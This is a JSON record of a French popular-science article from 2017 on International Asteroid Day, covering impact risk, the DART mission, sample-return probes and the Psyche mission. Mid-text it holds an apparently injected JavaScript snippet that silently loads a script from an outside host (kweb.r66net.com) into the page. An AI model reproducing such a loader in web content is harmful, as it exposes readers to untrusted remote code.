{"title": "Journee mondiale des asteroides : que peuvent-ils nous reveler ?", "newspaper": "Futura Sciences", "author": ["CNES"], "date_publi": "2017-06-30", "content": "Pour la Journee internationale des asteroides, l'astrophysicien Francis Rocard parle de ces corps celestes qui nous intriguent, nous attirent et parfois nous inquietent. Des centaines de milliers d'asteroides qui sont autant de mines d'informations sur la naissance des planetes et aussi, pour certains, de nouvelles mines a exploiter. En 2013, les habitants de  Tcheliabinsk , dans l'Oural (Russie), se sont fait une belle frayeur lorsqu'un asteroide de 16 metres a explose a basse altitude, causant de gros degats. Pour impressionnant qu'il soit, cet evenement est heureusement peu frequent. En effet,  << chaque annee, la  masse  equivalente d' asteroides  qui tombe sur  Terre  se chiffre en tonnes mais, le plus souvent, ce sont des objets de petite taille qui se pulverisent en entrant dans l' atmosphere  sans dommages >> , precise  Francis Rocard , responsable des programmes d'exploration du  Systeme solaire  au Cnes. Evidemment, les risques augmentent avec la taille : un objet d'un kilometre creuserait un cratere d'une dizaine de kilometres, et au-dela de deux kilometres, ses effets seraient devastateurs et globaux. Mais pas d'inquietude,  Armageddon  n'est pas pour demain ! Sur les quelque 730.000  asteroides  recenses, parmi lesquels 900  geocroiseurs  (ou NEO pour  Near Earth Objects ) de plus d'un kilometre - ceux dont l' orbite  croise celle de la Terre -, aucun ne presente un risque identifie. Repartition des asteroides dans le Systeme solaire. (c) Nasa                               \" Ils sont tres interessants parce que ce sont les restes de planetes qui ne se sont pas formees Les asteroides sont des mines d'informations << Si le risque devenait vraiment important, la question serait de savoir de combien de temps on dispose , poursuit Francis Rocard.  Plusieurs strategies ont ete etudiees, comme la mission Dart, qui partira peut-etre en 2020 pour tester la  deviation par impact  de Didymoon, la  lune  de l'asteroide Didymos. >>  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Independamment de la question du risque, les asteroides interessent les planetologues au plus haut point. Ces objets celestes, de petite taille comparee aux planetes, gravitent pour la plupart dans la Ceinture principale, entre Mars et  Jupiter , et egalement dans la  ceinture de Kuiper , au-dela de  Neptune . Souvent rocheux, parfois hydrates ou metalliques, ils sont de compositions tres variables. << Ils sont tres interessants parce que ce sont les restes de planetes qui ne se sont pas formees , detaille Francis Rocard.  Les plus petits ont conserve les signatures chimiques et mineralogiques des materiaux qui ont constitue le Systeme solaire au moment de sa formation. Cela permet d'etudier l'origine et l'evolution du Systeme solaire. >> Le geocroiseur YB35, au premier plan de l'image composite, est passe pres de la Terre le 27 mars 2014. Il repassera dans les parages en 2033. (c) J. Major                               Depuis la mission Near, a la fin des annees 1990, qui a etudie le geocroiseur Eros, une dizaine d'asteroides ont ete survoles par des sondes, tels que Steins et  Lutetia , atteints par la mission europeenne  Rosetta ,  Ceres  et  Vesta  visites par  Dawn , ou encore Itokawa, par la sonde  Hayabusa  (la premiere a avoir rapporte sur Terre des echantillons). << Plusieurs missions en cours ont pour but de rapporter sur Terre des echantillons : le Cnes contribue avec l'atterrisseur Mascot a la mission japonaise  Hayabusa 2 , qui arrivera au voisinage de l'asteroide Ryugu en 2018.  Osiris Rex , quant a lui, rapportera en 2023 des echantillons de l'asteroide Bennu. >> Et apres ? En 2017, la  Nasa a decide deux nouvelles missions  : Lucy, en 2021, qui etudiera les  asteroides troyens  de Jupiter, et Psyche, qui partira en 2022 pour rendre visite, pour la premiere fois, a un asteroide metallique. Au-dela de l'exploration scientifique, faut-il y voir un nouveau  gisement  de ressources minieres ? Cela reste hautement speculatif, mais ils sont une mine d'informations, sans aucun doute... Le saviez-vous ? Le 30 juin 2017 est la premiere  Journee internationale de l'asteroide . L'ONU a choisi cette date en reference a l'evenement de Tunguska, en Siberie, qui s'est produit le 30 juin 1908. Il s'agit de la chute d'asteroide la plus retentissante de l'histoire moderne. Selon les etudes, l'objet qui a explose dans l'atmosphere au-dessus d'une region, heureusement peu peuplee, devait mesurer 40 m de diametre. Celui de Tcheliabinsk, en 2013, etait deux fois plus petit. La Journee internationale de l'asteroide ( Asteroid Day ) vise a sensibiliser le grand public aux menaces que representent les asteroides mais aussi a mieux connaitre ces corps residuels de la formation des planetes. Voir aussi : Le Luxembourg estime que l'exploitation miniere des asteroides sera difficile En video : la future sonde Psyche survole l'etrange asteroide du meme nom                       La Nasa offre un avant-gout de la mission Psyche, qui doit etre lancee en 2023, autour de l'asteroide du meme nom. D'un diametre estime a 210 kilometres, il est l'un des dix corps les plus massifs de la ceinture principale, entre Mars et Jupiter. C'est aussi l'un des plus etranges. De par sa composition essentiellement metallique, il est considere comme le reste du noyau d'une ancienne planete. Pour les astronomes, une enquete sur le cas unique de Psyche s'impose. Ce fossile a beaucoup a dire sur nos origines.                                       ", "theme": "sciences"}